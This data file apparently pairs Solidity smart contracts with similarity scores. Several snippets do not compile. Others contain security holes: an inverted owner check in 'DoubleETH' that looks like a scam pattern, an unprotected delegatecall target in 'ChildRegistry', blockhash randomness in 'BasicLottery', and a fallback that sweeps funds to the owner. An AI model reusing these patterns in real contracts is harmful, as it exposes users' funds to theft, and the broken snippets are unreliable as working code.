
        require(whitelist[msg.sender]);

        _;

    }



    constructor() public {

            whitelist[msg.sender] = true;  

    }



    function addAddressToWhitelist(address addr) onlyWhitelisted public returns(bool success) {

        if (!whitelist[addr]) {

            whitelist[addr] = true;



            countAddress = countAddress + 1;

            whitelistCheck[countAddress] = addr;



            emit WhitelistedAddressAdded(addr);

            success = true;

        }

    }



    function getWhitelistCheck(uint key) onlyWhitelisted view public returns(address) {

        return whitelistCheck[key];

    }





    function getInWhitelist(address addr) public view returns(bool) {

        return whitelist[addr];

    }

    function getOwnerCEO() public onlyWhitelisted view returns(address) {

        return ownerCEO;

    }

 

    function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {

        for (uint256 i = 0; i < addrs.length; i++) {

            if (addAddressToWhitelist(addrs[i])) {

                success = true;

            }

        }

    }

    

    function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {

        if (whitelist[addr]) {

            whitelist[addr] = false;

            emit WhitelistedAddressRemoved(addr);

            success = true;

        }

    }



    function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {

        for (uint256 i = 0; i < addrs.length; i++) {

            if (removeAddressFromWhitelist(addrs[i])) {

                success = true;

            }

        }

    }

}"
"contract Voting {

mapping (bytes32 => uint8) public votesReceived;

address sender;

bytes32[] public candidateList;
event Updatestatus (string _msg,address sender);
function Voting(bytes32[] candidateNames) {
candidateList = candidateNames;
}

function totalVotesFor(bytes32 candidate) returns (uint8) {
   if (validCandidate(candidate) == false) throw;
return votesReceived[candidate];
}

function voteForCandidate(bytes32 candidate) payable {
   if (validCandidate(candidate) == false) 
   throw;
   else{
   Updatestatus(""First vote casted by"",msg.sender);
   votesReceived[candidate] += 1;

 }
 }

   function validCandidate(bytes32 candidate) returns (bool) {
     for(uint i = 0; i < candidateList.length; i++) {
   if (candidateList[i] == candidate) {
    return true;
    }
   }
   return false;
   }
    }",0.5613001521262846,"contract SignatureReg is Owned {
  
  mapping (bytes4 => string) public entries;

  
  uint public totalSignatures = 0;

  
  modifier when_unregistered(bytes4 _signature) {
    if (bytes(entries[_signature]).length != 0) return;
    _;
  }

  
  event Registered(address indexed creator, bytes4 indexed signature, string method);

  
  function SignatureReg() {
    register(&#39;register(string)&#39;);
  }

  
  function register(string _method) returns (bool) {
    return _register(bytes4(sha3(_method)), _method);
  }

  
  function _register(bytes4 _signature, string _method) internal when_unregistered(_signature) returns (bool) {
    entries[_signature] = _method;
    totalSignatures = totalSignatures + 1;
    Registered(msg.sender, _signature, _method);
    return true;
  }

  
  function drain() only_owner {
    if (!msg.sender.send(this.balance)) {
      throw;
    }
  }
}"
"contract ChildRegistry is BaseRegistry {

address public owner;
address public nodeDelegateAddress;
address[] public registeredNodes;

address public delegateContract;
address[] public previousDelegates;
uint256 public count;
address public tokenAddress;

  event DelegateChanged(address oldAddress, address newAddress);

  function ChildRegistry() {
    
  }

  function changeDelegate(address _newDelegate) returns (bool) {
    

    if (_newDelegate != delegateContract) {
        previousDelegates.push(delegateContract);
        var oldDelegate = delegateContract;
        delegateContract = _newDelegate;
        DelegateChanged(oldDelegate, _newDelegate);
        return true;
      }
    return false;

}

  function registerNode() {
    delegateContract.delegatecall(bytes4(sha3(""registerNode()"")));
  }

  function createNodeContract () {
    delegateContract.delegatecall(bytes4(sha3(""createNodeContract()"")));
  }

  function getNodes() constant returns (address[]) {
    return registeredNodes;
  }

  function setTokenAddress(address _tokenAddress) {
    delegateContract.delegatecall(bytes4(sha3(""setTokenAddress(address)"")), _tokenAddress);
  }
  function setNodeDelegateAddress(address _nodeDelegateAddress) {
    delegateContract.delegatecall(bytes4(sha3(""setNodeDelegateAddress(address)"")), _nodeDelegateAddress);
  }


}",0.5813282358173854,"contract PausedDelegateERC20 is PausedToken {



    address public constant DELEGATE_FROM = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;

    

    modifier onlyDelegateFrom() {

        require(msg.sender == DELEGATE_FROM);

        _;

    }



    function delegateTotalSupply() public view returns (uint256) {

        return totalSupply();

    }



    function delegateBalanceOf(address who) public view returns (uint256) {

        return balanceOf(who);

    }



    function delegateTransfer(address , uint256 , address ) public onlyDelegateFrom returns (bool) {

        revert(""Token Paused"");

    }



    function delegateAllowance(address owner, address spender) public view returns (uint256) {

        return _getAllowance(owner, spender);

    }



    function delegateTransferFrom(address , address , uint256 , address ) public onlyDelegateFrom returns (bool) {

        revert(""Token Paused"");

    }



    function delegateApprove(address , uint256 , address ) public onlyDelegateFrom returns (bool) {

        revert(""Token Paused"");

    }



    function delegateIncreaseApproval(address , uint , address ) public onlyDelegateFrom returns (bool) {

        revert(""Token Paused"");

    }



    function delegateDecreaseApproval(address , uint , address ) public onlyDelegateFrom returns (bool) {

        revert(""Token Paused"");

    }

}"
"contract MyContract {
    INotMyContract private notMyContract;
    constructor(INotMyContract _notMyContract) public {
        notMyContract = _notMyContract;
    }
    function test() public view returns (uint256, uint256) {
        return notMyContract.func();
    }
}",0.5477612582618292,"contract ConstantPriceOracle is
    IOracle
{
    
    uint256 public stablePrice;

    
    
    constructor(
        uint256 _stablePrice
    )
        public
    {
        stablePrice = _stablePrice;
    }

    
    function read()
        external
        view
        returns (uint256)
    {
        return stablePrice;
    }
}"
"contract Courses {

    struct Instructor {
        string  age; 
        string  fName;
        string  lName;
    }

    mapping (address => Instructor) public instructors; 
    address[] public instructorAccts;

    function setInstructor(address _address, uint256 _age, string memory _fName, string memory _lName) public {

        Instructor memory instructor = Instructor(_age, _fName, _lName); 
        instructor[_address] = instructor;
        instructor.age = _age;
        instructor.fName = _fName;
        instructor.lName = _lName;

        instructorAccts.push(_address) -1;
    }

    function getInstructors() view public returns(address[] memory) {
        return instructorAccts;
    }

    function getInstructor(address _address) view public returns (uint, string memory, string memory) {
        return (instructors[_address].age, instructors[_address].fName, instructors[_address].lName);
    }

    function countInstructors() view public returns (uint256) {
        return instructorAccts.length;
    }

}",0.5749262798892693,"contract standardTokenFactory {
    
    
    
    string public stamp;
    bool public gated;
    address public deployer;
    
    standardToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor (string memory _stamp, bool _gated, address _deployer) public 
	{
        stamp = _stamp;
        gated = _gated;
        deployer = _deployer;
	}
    
    function newToken(
        string memory name, 
		string memory symbol,
		string memory _stamp,
		uint8 decimals,
		uint256 cap,
		uint256[] memory initialSupply,
		address[] memory ownership) public {
       
        if (gated == true) {
            require(msg.sender == deployer);
        }
       
        ST = new standardToken(
            name, 
            symbol, 
            _stamp,
            decimals,
            cap,
            initialSupply,
            ownership);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract TugOfWar {

    int public score = 0;
    int constant endAt = 1 ether;
    bool public gameOver = false;
    bool public _direction;
    
    event ScoreChanged(int _amount, bool _direction);
    event GameEnded(bool _gameOver);

    function up() external payable {
        require(msg.value > 0);
        require(!gameOver);

        int value = int(msg.value);
        score += value;

         ScoreChanged(value,true);

        checkIfGameOver();
    }

    function down() external payable {
        require(msg.value > 0);
        require(!gameOver);

        int value = int(msg.value);
        score -= value;

         ScoreChanged(value,false);

        checkIfGameOver();
    }

    function checkIfGameOver() internal {
        if(score >= endAt || score <= endAt * -1) {
            gameOver = true;
             GameEnded(gameOver);
        }
    }
}",0.5675493180434888,"contract DoubleETH {



    address public richest;

    address public owner;

    uint public mostSent;



    modifier onlyOwner() {

        require (msg.sender != owner);

        _;



    }



    mapping (address => uint) pendingWithdraws;



    function DoubleETH () payable {

        richest = msg.sender;

        mostSent = msg.value;

        owner = msg.sender;

    }



    function becomeRichest() payable returns (bool){

        require(msg.value > mostSent);

        pendingWithdraws[richest] += msg.value;

        richest = msg.sender;

        mostSent = msg.value;

        return true;

    }



    function withdraw(uint amount) onlyOwner returns(bool) {

        

        

        

        require(amount < this.balance);

        owner.transfer(amount);

        return true;



    }



    function getBalanceContract() constant returns(uint){

        return this.balance;

    }



}"
"contract TestBetting {

  struct BettingInfo {    
      uint256 matchId;
      uint homeTeamScore;
      uint awayTeamScore;     
      uint bettingPrice;  
  }

  address public owner;
  mapping(address => BettingInfo[]) public bettingInfo;

 
  function MyBetting() {
    owner = msg.sender;
  }

  
  function () payable {}

  event LogDeposit(address sender, uint amount);

  
  function placeBet(uint256 _matchId, 
                    uint _homeTeamScore, 
                    uint _awayTeamScore, 
                    uint _bettingPrice) payable returns (bool) {

    bettingInfo[msg.sender].push(
      BettingInfo(_matchId, _homeTeamScore, _awayTeamScore, _bettingPrice)); 

    require(_bettingPrice == msg.value); 
    this.transfer(msg.value); 

    LogDeposit(msg.sender, msg.value);

    return true;
  }

  function getBettingInfo(address _better) public constant returns (uint256[], uint[], uint[], uint[]) {
    uint length = bettingInfo[_better].length;
    uint256[] memory matchId = new uint256[](length);
    uint[] memory homeTeamScore = new uint[](length);
    uint[] memory awayTeamScore = new uint[](length);
    uint[] memory bettingPrice = new uint[](length);   

    for (uint i = 0; i < length; i++) {
      matchId[i] = bettingInfo[_better][i].matchId;
      homeTeamScore[i] = bettingInfo[_better][i].homeTeamScore;
      awayTeamScore[i] = bettingInfo[_better][i].awayTeamScore;
      bettingPrice[i] = bettingInfo[_better][i].bettingPrice;   
    }

    return (matchId, homeTeamScore, awayTeamScore, bettingPrice);
  }
}",0.5434870426927335,"contract OurERC20 {



  using SafeMath for uint256;

  string _name;

  string _symbol;

  mapping (address => uint256) _balances;

  uint256 _totalSupply;

  uint8 private _decimals;

  event Transfer(address indexed from, address indexed to, uint tokens);

  

  constructor() public {

    _name = ""HOLA"";

    _symbol = ""HL"";

    _decimals = 0;

  }

  

  function decimals() public view returns(uint8) {

      return _decimals;

  }

  

  function totalSupply() public view returns (uint256) {

      return _totalSupply;

  }

  

  function name() public view returns (string memory) {

     return _name;

  }

  

  function symbol() public view returns (string memory) {

     return _symbol;

  }

  

  function mint(uint256 amount) public payable {

      require(msg.value == amount.mul(0.006 ether));

      _balances[msg.sender] = _balances[msg.sender].add(amount);

      _totalSupply = _totalSupply + amount;

  }

  

  function burn(uint256 amount) public {

      require(_balances[msg.sender] == amount);

      _balances[msg.sender] = _balances[msg.sender].sub(amount);

      msg.sender.transfer(amount.mul(0.006 ether));

      _totalSupply = _totalSupply - amount;

  }

  

  function transfer(address _to, uint256 value) public returns (bool success) {

      require(_balances[msg.sender] >= value);

      _balances[msg.sender] = _balances[msg.sender].sub(value);

      _balances[_to] = _balances[_to].add(value);

      emit Transfer(msg.sender, _to, value);      

      return true;

  }

  

  

  

  

  

  

}"
"contract StockPriceOracle {
  uint quoteFee = 500;
  mapping (string => uint) private stockPrices;

  

  function getStockPrice(string _stockTicker) payable returns (uint _stockPrice) {
    if (msg.value == quoteFee) {
      
      _stockPrice = stockPrices[_stockTicker];
    } else {
      revert();
    }
  }
}",0.5244022028925682,"contract IVerifier {

    function verify(

                    uint256 _jobId,

                    uint256 _claimId,

                    uint256 _segmentNumber,

                    string _transcodingOptions,

                    string _dataStorageHash,

                    bytes32[2] _dataHashes

                    )

        external

        payable;



    function getPrice() public view returns (uint256);

}"
"contract Test {

   function Test() {
       intfunc(5);
   }

   uint8 store;

   function intfunc (uint8 a) internal {
       store = a * 9;
   }
}",0.5801891699780454,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract ZooFactory {

    event NewZoo(uint zooId, string name, uint dna);

    uint dnaDigits = 24;
    uint dnaModulus = 10 ** dnaDigits;

    struct Zoo{
        string name;
        uint dna;
    }

    Zoo[] public zoos;



    function createZoo(string memory _name, uint _dna) private {
        uint id = zoos.push(Zoo(_name, _dna)) - 1;
        NewZoo(id, name, dna);
    }

    function generateRandomDna(string memory _str) private view returns(uint) {
        uint rand = uint(keccak256(abi.encodePacked(_str));
        return rand % dnaModulus;
    }

    function createRandomZoo(string memory _name) public {
        uint randDna = _generateRandomDna(_name);
        createZoo(_name, randDna);
    }
}",0.5952272609603771,"contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function qrcode() public pure returns (string memory) {
        string memory url;
        url= 'https:
        return url;
    }
}"
"contract Price {
    uint[] public priceHistory;
    function logPrice(uint price) public {
        priceHistory.push(price);
    }
}",0.5702678347579813,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract C {
    Set.Data knownValues;

    function register(uint value) public {
        
        
        
        require(Set.insert(knownValues, value));
    }
    
}",0.5842224461509221,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value, bytes _data) public pure;

}"
"contract BasicLottery {

        
            mapping(uint => address) public gamblers;


            uint public my_length; 
            uint public random; 

            function BasicLottery(){
                my_length == 0;
            }
        
        
        

        function bet() payable {

        
        
        require(msg.value == 1);

        my_length +=1;

        gamblers[my_length] = msg.sender;

        if (my_length == 5) {
            
            random = uint(block.blockhash(block.number-1))%5 + 1;
            gamblers[random].transfer(5);
            my_length == 0;

        }
    }
}",0.5971444291791128,"contract Distribute {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferETHS(address[] _tos) payable public returns(bool) {
        require(_tos.length > 0);
        uint val = this.balance / _tos.length;
        for (uint i = 0; i < _tos.length; i++) {
            _tos[i].transfer(val);
        }
        return true;
    }

    function () payable public {
        owner.transfer(this.balance);
    }
}"
"contract Foo {
   enum Letter {A, B, C}
   function say(uint index) returns (Letter) {
       if(index == 0) return Letter.A;
       if(index == 1) return Letter.B;
       if(index == 2) return Letter.C;
       throw;
   }
}",0.5500928941050666,"contract Context {
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}"
"contract MyContract {
    function buyAndSell() payable public {
        uint256 tradeSize = msg.value;

        address daiExchangeAddress = 0xc0fc958f7108be4060F33a699a92d3ea49b0B5f0;
        ERC20 daiToken = ERC20(0xaD6D458402F60fD3Bd25163575031ACDce07538D);

        UniswapExchangeInterface usi = UniswapExchangeInterface(daiExchangeAddress);

        uint256 daiAmount = buyCurrencyUniswapV1(usi, daiToken, tradeSize);
        emit successfulTrade(tradeSize, ""ETH"", daiAmount, ""DAI"");
        uint256 ethFromDai = sellCurrencyUniswapV1(usi, daiAmount);
        emit successfulTrade(daiAmount, ""DAI"", ethFromDai, ""ETH"");
    }

    function buyCurrencyUniswapV1(UniswapExchangeInterface usi, ERC20 token, uint256 tradeSize) private returns (uint256) {
        
        uint256 tokensBack = usi.ethToTokenSwapInput.value(tradeSize)(1, block.timestamp);

        
        

        return tokensBack;
    }

    function sellCurrencyUniswapV1(UniswapExchangeInterface usi, uint256 tradeSize) private returns (uint256) {
        uint256 etherBack = usi.tokenToEthSwapInput(tradeSize, 1, block.timestamp);

        
        

        return etherBack;
    }

    event successfulTrade(uint256 fromAmount, string fromCurrency, uint256 toAmount, string toCurrency);
}",0.519041096458217,"contract Sale is Ownable {
  using SafeMath for uint256;

  SMEBankingPlatformToken public token;

   
  address public wallet;

  
  uint256 public rate = 26434;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

  function Sale(address _tokenAddress, address _wallet) public {
    token = SMEBankingPlatformToken(_tokenAddress);
    wallet = _wallet;
  }

  function () external payable {
    buyTokens(msg.sender);
  }

  function setRate(uint256 _rate) public onlyOwner {
    require(_rate > 0);
    rate = _rate;
  }

  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(msg.value != 0);

    uint256 weiAmount = msg.value;

    uint256 tokens = getTokenAmount(weiAmount);

    weiRaised = weiRaised.add(weiAmount);

    token.transfer(beneficiary, tokens);

    TokenPurchase(
      msg.sender,
      beneficiary,
      weiAmount,
      tokens
    );

    forwardFunds();
  }

  
  function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    return weiAmount.mul(rate);
  }

  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}"
"contract problem2_bank {
    address private _owner;
    LoanToken public loanToken;
    uint private loansCount = 0;
    uint private guaranteesCount = 0;
    mapping (uint => Loan) private loans;
    mapping (uint => Guarantee) private guarantees;
    mapping (uint => address payable) private lenders;

    constructor(address loanTokenAddress) public 
    {
        _owner = msg.sender;
        loanToken = LoanToken(loanTokenAddress);
    }

    
    

    struct Loan {
        address payable loanee;
        uint etherBorrow;
        uint index;
        uint payBackDate;
        uint etherInterest;
        bool _isGuaranteeProvided;
        bool _isLoanProvided;
        bool _isLoanExist;
    }

    struct Guarantee {
        address payable guarantor;
        uint etherInterest;
        uint loanIndex;
        bool _isWaitingForHandling;
        bool _isGuaranteeExist;
    }

    function getAllowance(address spender) public view returns(uint)
    {
        return loanToken.allowance(msg.sender, spender);
    }

    function giveFifteenthTokens(address spender) public returns(bool)
    {
        require(msg.sender == _owner, ""You are not owner of that smart contract"");
        require(spender != _owner, ""The owner of the smart contract can't receive tokens from himself"");

        
        
        

        
        
        
        
        loanToken.transfer(spender, 15);

        return true;
    }

    function getBalanceOfTokens(address account) public view returns(uint)
    {
        return loanToken.balanceOf(account);
    }

    function requestLoan(uint etherBorrow, uint8 payBackDate, uint8 etherInterest) public
    {
        Loan memory loan = Loan({loanee: msg.sender, index: loansCount, etherBorrow: etherBorrow,
                                        payBackDate: now + (payBackDate * 1 days), etherInterest: etherInterest,
                                        _isGuaranteeProvided: false, _isLoanProvided: false, _isLoanExist: true});
        loans[loansCount] = loan;
        loansCount++;
    }

    function provideGuarantee(uint index, uint8 guaranteeInterest) public 
    {
        require(
            index < loansCount,
            ""This index does not exist"");

        require(loans[index].loanee != msg.sender,
                ""The borrower can't provide a guarantee to himself"");

        require(lenders[index] != msg.sender,
                ""The lender can't provide guarantee for the loan"");

        require(!loans[index]._isGuaranteeProvided, 
            ""This loan already has a guarantee"");

        require(guaranteesCount < loansCount || !guarantees[index]._isWaitingForHandling, 
            ""This guarantee already waiting for handling of borrower"");

        require(guaranteeInterest > 0, 
                ""Too low interest"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

        require(
            !guarantees[index]._isGuaranteeExist,
            ""This guarantee does exist"");

        Guarantee memory guarantee = Guarantee({guarantor: msg.sender, etherInterest: guaranteeInterest,
                                                    loanIndex: index, _isWaitingForHandling: true, _isGuaranteeExist: true});
        guarantees[index] = guarantee;
        guaranteesCount++;
    }

    function handleGuarantee(uint index, bool isGuaranteeProvided) public
    {
        require(
            index < loansCount,
            ""This index does not exist"");

        require(loans[index].loanee == msg.sender, 
            ""This is not your loan"");

        require(guarantees[index]._isWaitingForHandling,
            ""Guarantee already processed"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

        require(
            guarantees[index]._isGuaranteeExist,
            ""This guarantee does not exist"");

        loans[index]._isGuaranteeProvided = isGuaranteeProvided;
        guarantees[index]._isWaitingForHandling = false;

        if(!loans[index]._isGuaranteeProvided){
            guarantees[index].guarantor.transfer(loans[index].etherBorrow); 
            require(
                loanToken.approve(msg.sender, loans[index].etherBorrow),
                            ""You don't receive approval from loanToken for this amount"");

            require(
            loanToken.transferFrom(_owner, msg.sender, loans[index].etherBorrow),
                            ""You don't receive tokens from loanToken for this amount"");

            delete guarantees[index];
            guaranteesCount--;
        }
    }

    function getLoansInfo(uint index) public view returns(uint, bool, uint, address payable) {
        require(
            lenders[index] == msg.sender,
            ""You are not a leander of this loan"");

        require(
            index < loansCount,
            ""This index does not exist"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

       return(loansCount,   
                loans[index]._isGuaranteeProvided, 
                loans[index].etherBorrow * loans[index].etherInterest / 100,    
                guarantees[index].guarantor);   
    }

    function provideLoanForLoanee(uint index) public payable
    {
        require(
            lenders[index] == address(0),
            ""The lender for this loan is already exist"");

        require(
            loans[index].loanee != msg.sender,
            ""You are not a lender"");

        require(
            guarantees[index].guarantor != msg.sender,
            ""You are not a lender"");

        require(
            index < loansCount,
            ""This index does not exist"");

        require(
            loans[index]._isGuaranteeProvided,
            ""This loan doesn't have a guarantee"");

        require(
            !loans[index]._isLoanProvided,
            ""This loan is already provided"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

        require(
            msg.value == loans[index].etherBorrow,
            ""You don't have enough ether"");

        require(
            loanToken.allowance(msg.sender, loans[index].loanee) == loans[index].etherBorrow,  
            ""You don't have enough ether"");

        loans[index].loanee.transfer(loans[index].etherBorrow); 
        loans[index]._isLoanProvided = true;
        lenders[index] = msg.sender;
    }

    function isBorrowerTransferEtherAtTime(uint index) public 
    {
        require(
            lenders[index] != address(0),
            ""Loan doesn't have a lender"");

        require(
            lenders[index] == msg.sender,
            ""You are not leander of this loan"");

        require(
            index < loansCount,
            ""This index does not exist"");

        require(
            loans[index]._isLoanProvided,
            ""This loan has not yet been provided"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

        
        if(loans[index].payBackDate * 1 days <= now){
            
            lenders[index].transfer(loans[index].etherBorrow); 

            
            delete loans[index];
            loansCount--;

            
            delete guarantees[index];
            guaranteesCount--;

            
            delete lenders[index];
        }
    }

    function payBackLoan(uint index) public payable {
        require(
            index < loansCount,
            ""This index does not exist"");

        require(loans[index].loanee == msg.sender, 
            ""This is not your loan"");

        require(
            loans[index]._isLoanProvided,
            ""This loan was not provided"");

        require(
            loans[index]._isLoanExist,
            ""This loan does not exist"");

        require(
            guarantees[index]._isGuaranteeExist,
            ""This guarantee does not exist"");

        uint amount = (loans[index].etherBorrow + loans[index].etherBorrow * guarantees[index].etherInterest / 100) +
                            (loans[index].etherBorrow * loans[index].etherInterest / 100);

        require(
            msg.value == amount, 
            ""You should to pay back amount with interest"");

        
        guarantees[index].guarantor.transfer(loans[index].etherBorrow + loans[index].etherBorrow * guarantees[index].etherInterest / 100);

        
        lenders[index].transfer(loans[index].etherBorrow + loans[index].etherBorrow * loans[index].etherInterest / 100);

        
        delete loans[index];
        loansCount--;

        
        delete guarantees[index];
        guaranteesCount--;

        
        delete lenders[index];
    }
}",0.5067402944716857,"contract TribalWarfare {



  



  

  modifier onlyOwner() {

    require(msg.sender == contractOwner);

    _;

  }



  

  modifier notContract() {

    require(tx.origin == msg.sender);

    _;

  }



  

  modifier notPaused() {

    require(paused == false);

    _;

  }



  

  modifier easyOnGas() {

    require(tx.gasprice < 99999999999);

    _;

  }



  



  event onTokenSold(

       uint256 indexed tokenId,

       uint256 price,

       address prevOwner,

       address newOwner,

       string name

    );



    event onRoundEnded(

         uint256 indexed roundNumber,

         uint256 indexed tokenId,

         address owner,

         uint256 winnings

      );



  



  uint256 private increaseRatePercent =  135;

  uint256 private devFeePercent =  5;

  uint256 private currentPotPercent =  5;

  uint256 private nextPotPercent =  5;

  uint256 private exchangeTokenPercent =  10;

  uint256 private previousOwnerPercent =  110;

  uint256 private initialRoundDuration =  12 minutes;



  



  

  mapping (uint256 => address) public tokenIndexToOwner;



  

  mapping (address => uint256) private ownershipTokenCount;



  

  address public contractOwner;



  

  uint256 public currentDevFee = 0;



  

  address public templeOfEthaddress = 0x0e21902d93573c18fd0acbadac4a5464e9732f54; 



  

  TempleInterface public templeContract;



  

  bool public paused = false;



  uint256 public currentPot =  0;

  uint256 public nextPot =  0;

  uint256 public roundNumber =  0;

  uint256 public roundEndingTime =  0;

  uint256 public lastFlip =  0; 



  



  struct TribalMask {

    string name;

    uint256 basePrice;

    uint256 currentPrice;

    uint256 timePowerMinutes;

  }



  TribalMask [6] public tribalMasks;



  constructor () public {



    contractOwner = msg.sender;

    templeContract = TempleInterface(templeOfEthaddress);

    paused=true;



    TribalMask memory _Yucatec = TribalMask({

            name: ""Yucatec"",

            basePrice: 0.018 ether,

            currentPrice: 0.018 ether,

            timePowerMinutes: 12 minutes

            });



    tribalMasks[0] =  _Yucatec;



    TribalMask memory _Chiapas = TribalMask({

            name: ""Chiapas"",

            basePrice: 0.020 ether,

            currentPrice: 0.020 ether,

            timePowerMinutes: 10 minutes

            });



    tribalMasks[1] =  _Chiapas;



    TribalMask memory _Kekchi = TribalMask({

            name: ""Kekchi"",

            basePrice: 0.022 ether,

            currentPrice: 0.022 ether,

            timePowerMinutes: 8 minutes

            });



    tribalMasks[2] =  _Kekchi;



    TribalMask memory _Chontal = TribalMask({

            name: ""Chontal"",

            basePrice: 0.024 ether,

            currentPrice: 0.024 ether,

            timePowerMinutes: 6 minutes

            });



    tribalMasks[3] =  _Chontal;



    TribalMask memory _Akatek = TribalMask({

            name: ""Akatek"",

            basePrice: 0.028 ether,

            currentPrice: 0.028 ether,

            timePowerMinutes: 4 minutes

            });



    tribalMasks[4] =  _Akatek;



    TribalMask memory _Itza = TribalMask({

            name: ""Itza"",

            basePrice: 0.030 ether,

            currentPrice: 0.030 ether,

            timePowerMinutes: 2 minutes

            });



    tribalMasks[5] =  _Itza;



    _transfer(0x0, contractOwner, 0);

    _transfer(0x0, contractOwner, 1);

    _transfer(0x0, contractOwner, 2);

    _transfer(0x0, contractOwner, 3);

    _transfer(0x0, contractOwner, 4);

    _transfer(0x0, contractOwner, 5);



  }



  

  

  function getTribalMask(uint256 _tokenId) public view returns (

    string maskName,

    uint256 basePrice,

    uint256 currentPrice,

    address currentOwner

  ) {

    TribalMask storage mask = tribalMasks[_tokenId];

    maskName = mask.name;

    basePrice = mask.basePrice;

    currentPrice = priceOf(_tokenId);

    currentOwner = tokenIndexToOwner[_tokenId];

  }



  

  

  function ownerOf(uint256 _tokenId)

    public

    view

    returns (address owner)

  {

    owner = tokenIndexToOwner[_tokenId];

    require(owner != address(0));

  }



  function () public payable {

      

      currentPot = currentPot + SafeMath.div(msg.value,2);

      nextPot = nextPot + SafeMath.div(msg.value,2);

  }



 function start() public payable onlyOwner {

   roundNumber = 1;

   roundEndingTime = now + initialRoundDuration;

   currentPot = currentPot + SafeMath.div(msg.value,2);

   nextPot = nextPot + SafeMath.div(msg.value,2);

   paused = false;

 }



 function isRoundEnd() public view returns (bool){

     return (now>roundEndingTime);

 }



 function newRound() internal {

   

   

    tokenIndexToOwner[lastFlip].transfer(currentPot);

   

   emit onRoundEnded(roundNumber, lastFlip, tokenIndexToOwner[lastFlip], currentPot);



   

   tribalMasks[0].currentPrice=tribalMasks[0].basePrice;

   tribalMasks[1].currentPrice=tribalMasks[1].basePrice;

   tribalMasks[2].currentPrice=tribalMasks[2].basePrice;

   tribalMasks[3].currentPrice=tribalMasks[3].basePrice;

   tribalMasks[4].currentPrice=tribalMasks[4].basePrice;

   tribalMasks[5].currentPrice=tribalMasks[5].basePrice;

   roundNumber++;

   roundEndingTime = now + initialRoundDuration;

   currentPot = nextPot;

   nextPot = 0;

 }



  

  function purchase(uint256 _tokenId , address _referredBy) public payable notContract notPaused easyOnGas  {



    

    if (now >= roundEndingTime){

        newRound();

    }



    uint256 currentPrice = tribalMasks[_tokenId].currentPrice;

    

    require(msg.value >= currentPrice);



    address oldOwner = tokenIndexToOwner[_tokenId];

    address newOwner = msg.sender;



     

    require(oldOwner != newOwner);



    

    require(_addressNotNull(newOwner));



    uint256 previousOwnerGets = SafeMath.mul(SafeMath.div(currentPrice,increaseRatePercent),previousOwnerPercent);

    uint256 exchangeTokensAmount = SafeMath.mul(SafeMath.div(currentPrice,increaseRatePercent),exchangeTokenPercent);

    uint256 devFeeAmount = SafeMath.mul(SafeMath.div(currentPrice,increaseRatePercent),devFeePercent);

    currentPot = currentPot + SafeMath.mul(SafeMath.div(currentPrice,increaseRatePercent),currentPotPercent);

    nextPot = nextPot + SafeMath.mul(SafeMath.div(currentPrice,increaseRatePercent),nextPotPercent);



    

    if (msg.value > currentPrice){

      if (now < roundEndingTime){

        nextPot = nextPot + (msg.value - currentPrice);

      }else{

        

        msg.sender.transfer(msg.value - currentPrice);

      }

    }



    currentDevFee = currentDevFee + devFeeAmount;



    templeContract.purchaseFor.value(exchangeTokensAmount)(_referredBy, msg.sender);



    

    _transfer(oldOwner, newOwner, _tokenId);



    

    tribalMasks[_tokenId].currentPrice = SafeMath.mul(SafeMath.div(currentPrice,100),increaseRatePercent);

    

    roundEndingTime = roundEndingTime + tribalMasks[_tokenId].timePowerMinutes;



    lastFlip = _tokenId;

    

    if (oldOwner != address(this)) {

      if (oldOwner.send(previousOwnerGets)){}

    }



    emit onTokenSold(_tokenId, currentPrice, oldOwner, newOwner, tribalMasks[_tokenId].name);



  }



  function priceOf(uint256 _tokenId) public view returns (uint256 price) {

      if(isRoundEnd()){

        return  tribalMasks[_tokenId].basePrice;

      }

    return tribalMasks[_tokenId].currentPrice;

  }



  

  

  function _addressNotNull(address _to) private pure returns (bool) {

    return _to != address(0);

  }



  

  function _owns(address claimant, uint256 _tokenId) private view returns (bool) {

    return claimant == tokenIndexToOwner[_tokenId];

  }



  

  function _transfer(address _from, address _to, uint256 _tokenId) private {



    

    uint length;

    assembly { length := extcodesize(_to) }

    require (length == 0);



    ownershipTokenCount[_to]++;

    

    tokenIndexToOwner[_tokenId] = _to;



    if (_from != address(0)) {

      ownershipTokenCount[_from]--;

    }



  }



  

  function collectDevFees() public onlyOwner {

      if (currentDevFee < address(this).balance){

         uint256 amount = currentDevFee;

         currentDevFee = 0;

         contractOwner.transfer(amount);

      }

  }



}"
"contract Bogus {

    mapping(address => bool) internal iNeedItToBeTrueByDefault;

    function Bogus() {

        ???...
    }
}",0.5853617151488644,"contract Token{

  function transfer(address to, uint value) external returns (bool);

}"
"contract ProblemDemo {

    string[] private myStringArray;

    constructor () public {
